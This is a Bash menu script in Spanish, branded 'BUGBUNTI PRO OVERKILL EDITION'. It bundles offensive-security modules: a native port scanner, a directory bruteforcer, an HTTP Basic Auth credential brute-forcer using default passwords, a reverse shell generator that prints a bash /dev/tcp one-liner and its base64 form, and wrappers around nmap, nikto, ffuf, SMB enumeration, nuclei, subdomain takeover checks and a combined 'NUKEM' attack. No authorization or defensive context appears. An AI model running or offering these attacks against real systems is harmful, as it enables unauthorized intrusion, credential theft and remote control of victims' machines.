#!/usr/bin/env bash
# BUGBUNTI PRO — OVERKILL MENU EDITION — 2025
# COMPLETO + TODAS LAS HERRAMIENTAS FUNCIONALES

set -uo pipefail   # No usamos -e para evitar que se cierre el script

# ----- COLORES -----
R='\033[1;31m'; G='\033[1;32m'; Y='\033[1;33m'
B='\033[1;34m'; C='\033[1;36m'; P='\033[1;35m'
W='\033[1;37m'; N='\033[0m'


# ----- BANNER -----
banner() {
clear
echo -e "
${P} ██████╗ ██╗   ██╗ ██████╗ ██████╗ ██╗   ██╗███╗   ██╗████████╗██╗
██╔═══██╗██║   ██║██╔════╝██╔═══██╗██║   ██║████╗  ██║╚══██╔══╝██║
██║   ██║██║   ██║██║     ██║   ██║██║   ██║██╔██╗ ██║   ██║   ██║
██║   ██║██║   ██║██║     ██║   ██║██║   ██║██║╚██╗██║   ██║   ██║
╚██████╔╝╚██████╔╝╚██████╗╚██████╔╝╚██████╔╝██║ ╚████║   ██║   ██║
 ╚═════╝  ╚═════╝  ╚═════╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚═╝

               ${W}B U G B U N T I   P R O   v15${N}
        ${C}OVERKILL EDITION · MENU BONITO · 2025${N}
${P}══════════════════════════════════════════════════════════════════════${N}
"
}


# ----- MENÚ -----
menu() {
    echo -e "
${P}╔══════════════════════════════════════════════════════════╗${N}
${P}║${W}                  MÓDULOS NATIVOS (SIN INSTALAR)            ${P}║${N}
${P}╠══════════════════════════════════════════════════════════╣${N}
${P}║ ${G}[01]${N} Escaneo de puertos nativo (1–1024)                ${P}║${N}
${P}║ ${G}[02]${N} Directory Bruteforce (curl)                       ${P}║${N}
${P}║ ${G}[03]${N} Bruteforce HTTP Basic Auth                        ${P}║${N}
${P}║ ${G}[04]${N} Generador de Reverse Shell                        ${P}║${N}
${P}╠══════════════════════════════════════════════════════════╣${N}
${P}║${W}                     MÓDULOS PRO (REQUIERE HERRAMIENTAS)       ${P}║${N}
${P}╠══════════════════════════════════════════════════════════╣${N}
${P}║ ${C}[11]${N} Nmap rápido (safe)                               ${P}║${N}
${P}║ ${C}[12]${N} Nmap FULL (agresivo)                             ${P}║${N}
${P}║ ${C}[13]${N} Ataque Web Completo (Nikto + FFUF)               ${P}║${N}
${P}║ ${C}[14]${N} SMB Enum Completo                                ${P}║${N}
${P}║ ${C}[15]${N} Nuclei – Critical/High                           ${P}║${N}
${P}║ ${C}[21]${N} Subfinder — Subdominios                           ${P}║${N}
${P}║ ${C}[22]${N} Subdomain Takeover                               ${P}║${N}
${P}╠══════════════════════════════════════════════════════════╣${N}
${P}║${Y}                     HERRAMIENTAS Y UTILIDADES                 ${P}║${N}
${P}╠══════════════════════════════════════════════════════════╣${N}
${P}║ ${Y}[50]${N} Installer PRO Completo (instala TODO)            ${P}║${N}
${P}║ ${R}[99]${N} MODO NUKEM TOTAL — ¡TODO A LA VEZ!               ${P}║${N}
${P}║ ${Y}[00]${N} Salir                                            ${P}║${N}
${P}╚══════════════════════════════════════════════════════════╝${N}
"
    echo -ne "${Y}║ Selecciona una opción → ${N}"
    read -r opt
}


# ========= INSTALADOR PRO ==========
installer_pro() {

echo -e "${G}Instalando herramientas...${N}"

if command -v apt >/dev/null 2>&1; then
    sudo apt update -y
    sudo apt install -y nmap nikto ffuf smbclient python3 git whois jq curl

    # enum4linux-ng
    if ! command -v enum4linux-ng >/dev/null; then
        git clone https://github.com/cddmp/enum4linux-ng /tmp/enum4
        sudo cp /tmp/enum4/enum4linux-ng /usr/local/bin/
        sudo chmod +x /usr/local/bin/enum4linux-ng
    fi

    # nuclei
    if ! command -v nuclei >/dev/null; then
        curl -s https://api.github.com/repos/projectdiscovery/nuclei/releases/latest \
        | jq -r '.assets[].browser_download_url' | grep linux | wget -i -
        tar -xvf nuclei*.tar.gz
        sudo mv nuclei /usr/local/bin/
    fi

    # subfinder
    if ! command -v subfinder >/dev/null; then
        curl -s https://api.github.com/repos/projectdiscovery/subfinder/releases/latest \
        | jq -r '.assets[].browser_download_url' | grep linux | wget -i -
        tar -xvf subfinder*.tar.gz
        sudo mv subfinder /usr/local/bin/
    fi

elif command -v pkg >/dev/null 2>&1; then
    pkg update -y
    pkg install -y nmap python git curl wget jq

    pip install enum4linux-ng nuclei subfinder || true

fi

echo -e "${G}[✔] Instalación completada${N}"
}


# ========= FUNCIONES NATIVAS ==========
scan_nativo() {
    echo -ne "${C}IP objetivo: ${N}"; read -r ip
    echo -e "${Y}Escanenado puertos 1–1024...${N}"

    (
        set +e
        for p in {1..1024}; do
            timeout 1 bash -c "echo >/dev/tcp/$ip/$p" 2>/dev/null &&
                echo -e "${G}[ABIERTO]${N} Puerto $p"
        done |
        sort -n
    )
}

dir_bruteforce() {
    echo -ne "${C}URL objetivo: ${N}"; read -r url
    wordlist=(admin login config uploads images .git .env wp-admin backup)

    echo -e "${Y}Buscando directorios...${N}"

    (
        set +e
        for d in "${wordlist[@]}"; do
            code=$(curl -s -o /dev/null -w "%{http_code}" "$url/$d")
            [[ "$code" =~ 200|301|302|403 ]] &&
                echo -e "${G}[$code]${N} $url/$d"
        done
    )
}

basic_brute() {
    echo -ne "${C}URL con Basic Auth: ${N}"; read -r url
    users=(admin root user test)
    pass=(admin 1234 123456 password)

    (
        set +e
        for u in "${users[@]}"; do
            for p in "${pass[@]}"; do
                code=$(curl -s -u "$u:$p" -o /dev/null -w "%{http_code}" "$url")
                [[ "$code" == 200 ]] &&
                    echo -e "${R}[VÁLIDA]${N} $u:$p"
            done
        done
    )
}

reverse_shell() {
    echo -ne "${C}Tu IP: ${N}"; read -r ip
    echo -ne "${C}Puerto: ${N}"; read -r port

    shell="bash -i >& /dev/tcp/$ip/$port 0>&1"
    echo -e "${Y}Reverse Shell:${N}"
    echo "$shell"
    echo -e "${C}Base64:${N} $(echo "$shell" | base64 -w 0)"
}


# ========= FUNCIONES PRO ==========
nmap_rapido() {
    echo -ne "${C}Target: ${N}"; read -r t
    nmap -sCV -T4 --open -p- "$t"
}

nmap_full() {
    echo -ne "${C}Target: ${N}"; read -r t
    nmap -p- -sCV --min-rate 5000 "$t"
}

ataque_web() {
    echo -ne "${C}Target (http://...): ${N}"; read -r t

    echo -e "${G}[1] Nikto${N}"
    nikto -h "$t"

    echo -e "${G}[2] FFUF${N}"
    ffuf -w /usr/share/wordlists/dirb/common.txt -u "$t/FUZZ"
}

smb_enum() {
    echo -ne "${C}Target SMB: ${N}"; read -r t

    echo -e "${G}[+] enum4linux-ng${N}"
    enum4linux-ng -A "$t"

    echo -e "${G}[+] smbclient${N}"
    smbclient -L "$t" -N

    echo -e "${G}[+] Nmap SMB scripts${N}"
    nmap -p 139,445 --script smb-enum* "$t"
}

nuclei_scan() {
    echo -ne "${C}Target: ${N}"; read -r t
    nuclei -u "$t" -severity critical,high
}

subfinder_scan() {
    echo -ne "${C}Dominio: ${N}"; read -r d
    subfinder -d "$d"
}

takeover_scan() {
    echo -ne "${C}Dominio: ${N}"; read -r d
    subfinder -d "$d" | nuclei -t takeovers -severity high,critical
}

nukem() {
    echo -ne "${R}[NUKEM] Target: ${N}"; read -r t
    echo -e "${R}Lanzando ataque combinado...${N}"

    nmap -p- -sCV "$t" &
    enum4linux-ng -A "$t" &
    nuclei -u "$t" &
    wait
}


# ========= LOOP PRINCIPAL ==========
while true; do
    banner
    menu

    case "$opt" in
        1|01) scan_nativo ;;
        2|02) dir_bruteforce ;;
        3|03) basic_brute ;;
        4|04) reverse_shell ;;
        11) nmap_rapido ;;
        12) nmap_full ;;
        13) ataque_web ;;
        14) smb_enum ;;
        15) nuclei_scan ;;
        21) subfinder_scan ;;
        22) takeover_scan ;;
        50) installer_pro ;;
        99) nukem ;;
        0|00) echo -e "${G}Nos vemos, crack.${N}"; exit 0 ;;
        *) echo -e "${R}Opción inválida.${N}" ;;
    esac

    echo -ne "${Y}Presiona Enter para volver al menú...${N}"
    read
done
